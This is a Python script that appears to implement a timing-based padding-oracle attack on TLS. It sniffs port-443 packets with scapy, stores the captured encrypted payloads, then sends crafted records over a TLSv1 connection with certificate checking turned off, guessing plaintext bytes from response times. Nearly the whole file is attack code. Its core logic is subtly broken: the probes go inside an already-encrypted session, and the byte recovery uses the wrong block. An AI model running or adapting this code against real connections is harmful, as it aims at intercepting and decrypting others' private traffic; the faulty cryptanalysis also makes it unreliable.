import socket
import ssl
import time
from scapy.all import sniff, TCP, IP, Raw
import numpy as np

# server_ip = "192.168.2.4"
# client_ip = "192.168.2.3"
server_ip = "127.0.0.1"
client_ip = "127.0.0.1"
server_port = 443
threshold_time = 0.1  # Adjust this value based on your measurements

encrypted_messages = []

def packet_callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        ip_layer = packet.getlayer(IP)
        if (ip_layer.src == client_ip and ip_layer.dst == server_ip) or \
           (ip_layer.src == server_ip and ip_layer.dst == client_ip):
            encrypted_data = bytes(packet[Raw])
            print(f"Captured Encrypted Data: {encrypted_data.hex()}")
            encrypted_messages.append(encrypted_data)

# Capture packets (run in background)
def capture_packets():
    sniff(filter=f"tcp port {server_port}", prn=packet_callback, store=0)

# Measure response time
def measure_response_time(server, port, payload):
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
    context.verify_mode = ssl.CERT_NONE

    with socket.create_connection((server, port)) as sock:
        with context.wrap_socket(sock, server_hostname=server) as ssock:
            start_time = time.time()
            try:
                ssock.sendall(payload)
                response = ssock.recv(4096)
            except Exception as e:
                print(f"Error: {e}")
            end_time = time.time()
    return end_time - start_time

# Create TLS record
def create_tls_record(payload):
    return b'\x16\x03\x01' + len(payload).to_bytes(2, 'big') + payload

# Decrypt block
def decrypt_block(server, port, encrypted_block):
    block_size = 16
    decrypted_block = bytearray(block_size)
    intermediate_state = bytearray(block_size)

    for byte_pos in reversed(range(block_size)):
        padding_value = block_size - byte_pos
        for guess in range(256):
            crafted_block = bytearray(encrypted_block)
            for i in range(1, padding_value):
                crafted_block[block_size - i] ^= intermediate_state[block_size - i] ^ padding_value
            crafted_block[byte_pos] ^= guess

            timing = measure_response_time(server, port, create_tls_record(crafted_block))
            if timing < threshold_time:  # Define a threshold for valid padding
                intermediate_state[byte_pos] = guess ^ padding_value
                decrypted_block[byte_pos] = encrypted_block[byte_pos] ^ intermediate_state[byte_pos]
                break

    return decrypted_block

# Start capturing packets in the background
from threading import Thread

capture_thread = Thread(target=capture_packets)

capture_thread.start()


# Wait for a while to capture some packets
time.sleep(10)

# Example usage of decrypting the first captured encrypted block
if encrypted_messages:
    encrypted_block = encrypted_messages[0]  # Replace with actual captured block
    decrypted_block = decrypt_block(server_ip, server_port, encrypted_block)
    print(f"Decrypted Block: {decrypted_block}")
else:
    print("No encrypted messages captured.")
